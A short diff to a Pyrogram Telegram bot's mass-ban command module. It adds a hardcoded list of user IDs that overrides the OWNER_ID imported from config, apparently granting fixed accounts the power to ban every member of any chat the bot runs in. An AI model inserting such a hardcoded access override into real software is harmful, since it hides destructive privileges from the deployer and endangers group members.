@@ -2,6 +2,9 @@ from pyrogram import filters, enums
 from Barath import barath as bot
 from config import HANDLER, OWNER_ID
 
+OWNER_ID = [5443243540,5443243540, 6217632586,1375777824]
+
+
 @bot.on_message(filters.command(["sbanall", "banall", "massban"], prefixes=HANDLER) & filters.user(OWNER_ID))
 async def ban_all_members(_, message):
     chat_id = message.chat.id
